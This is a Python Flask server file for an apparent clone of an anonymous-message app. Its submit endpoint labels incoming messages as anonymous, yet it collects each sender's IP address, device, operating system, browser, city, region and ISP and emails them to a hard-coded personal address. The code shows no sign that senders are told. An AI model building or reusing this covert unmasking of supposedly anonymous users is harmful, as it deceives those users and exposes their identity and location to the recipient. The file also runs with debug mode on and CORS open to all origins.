import os
from flask import Flask, request, jsonify
from flask_cors import CORS  # Import CORS
from flask_mail import Mail, Message  # Import Flask-Mail
import json

app = Flask(__name__)

# Enable CORS for the entire app
CORS(app)

# Set up email configuration
app.config['MAIL_SERVER'] = 'smtp.live.com'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USERNAME'] = os.getenv("HOTMAIL_EMAIL")
app.config['MAIL_PASSWORD'] = os.getenv("HOTMAIL_PASSWORD")
app.config['MAIL_DEFAULT_SENDER'] = os.getenv("HOTMAIL_EMAIL")

mail = Mail(app)

messages = []

@app.route('/submit', methods=['POST'])
def submit_message():
    try:
        data = request.json
        anonymous_message = data.get("message")
        ip = request.remote_addr
        device_type = data.get("device_type")
        os = data.get("os")
        browser = data.get("browser")
        screen_size = data.get("screen_size")
        city = data.get("city")
        region = data.get("region")
        isp_name = data.get("isp_name")
        connection_type = data.get("connection_type")

        message_data = {
            "message": anonymous_message,
            "ip": ip,
            "device_type": device_type,
            "os": os,
            "browser": browser,
            "screen_size": screen_size,
            "city": city,
            "region": region,
            "isp_name": isp_name,
            "connection_type": connection_type
        }
        messages.append(message_data)

        email_content = json.dumps(message_data, indent=4)

        msg = Message(
            subject="New Anonymous Message",
            recipients=["prakhardoneria3@gmail.com"],
            body=f"New message received on NGL Clone:\n\n{email_content}"
        )

        mail.send(msg)

        messages.clear()

        return jsonify({"success": True, "message": "Message stored and email sent successfully!"}), 200

    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True)
